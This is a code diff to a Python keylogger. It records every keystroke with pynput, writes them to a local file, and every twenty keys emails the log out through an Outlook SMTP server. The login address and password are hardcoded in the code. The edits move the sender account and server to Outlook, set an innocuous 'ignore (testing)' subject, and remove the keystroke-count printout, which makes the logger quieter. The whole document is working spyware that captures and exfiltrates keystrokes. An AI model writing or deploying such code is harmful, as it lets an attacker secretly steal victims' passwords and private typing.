@@ -1,17 +1,19 @@
 from pynput.keyboard import Key, Listener 
+import os
 
 
-counter =1
+counter = 1
 
 
 def mail_it():
+
 	import smtplib
 	from email.mime.text import MIMEText
 	from email.mime.multipart import MIMEMultipart
 
 	import os
 
-	mail = "alimehdibadamiexample791@gmail.com"
+	mail = "idkmyname791@outlook.com"
 	password = "alibadami0791"
 	# can also implement other arguments [target2@mail.com,target1@mail.com]
 
@@ -20,9 +22,8 @@ def mail_it():
 
 	#creating message
 	msg = MIMEMultipart("related")
-	msg['Subject'] = 'ignore'
-	msg['To'] = destination_mail
-	msg.preamble = "BOSS we"
+	msg['Subject'] = 'ignore (testing)'
+	msg.preamble = "hi boss"
 
 	with open("keyslogging.txt",'r') as plaintxt:
 		plain = plaintxt.read()
@@ -33,23 +34,21 @@ def mail_it():
 
 
 	#initializing smpt connection and sending mail
-	server = smtplib.SMTP("smtp.yahoo.com", 465) 
+	server = smtplib.SMTP("smtp.outlook.com", 587) 
 	server.starttls()
 	server.ehlo()
 	server.login(mail,password)
-	server.sendmail(mail,destination_mail ,MIMEText(msg.as_string()))
-	#server.attach(gmail,destination_mail,path)
+	server.sendmail(mail,destination_mail ,msg.as_string())
 
 	server.quit()
 	
 	
 def on_press(key):
 	write_1(key)
-
+	
 	global counter
-	counter +=1
-	print(counter)
-	if counter%20 == 0:
+	counter += 1
+	if counter % 20 == 0:
 		mail_it()
 
 
